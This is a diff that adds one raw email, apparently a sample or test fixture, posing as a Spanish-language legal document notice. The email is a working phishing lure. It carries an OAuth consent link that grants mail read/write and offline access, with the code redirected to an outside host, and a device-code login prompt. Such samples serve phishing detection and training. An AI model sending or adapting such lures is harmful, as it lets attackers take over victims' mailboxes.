@@ -1,0 +1,12 @@
+Authentication-Results: mx.google.com; dkim=pass header.i=@contoso-docs.com; spf=pass smtp.mailfrom=contoso-docs.com; dmarc=pass header.from=contoso-docs.com
+From: Equipo Legal <legal@contoso-docs.com>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Documento confidencial para revisión
+Date: Wed, 7 Oct 2026 09:00:00 -0500
+Message-ID: <31949@contoso-docs.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>Para ver el documento, autorice la aplicación:</p>
+<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fdoc-viewer-app.top%2Fcb&scope=Mail.ReadWrite%20offline_access">Abrir documento</a>
+<p>O ingrese el código <b>GH7K-2PQR</b> en <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a></p></body></html>
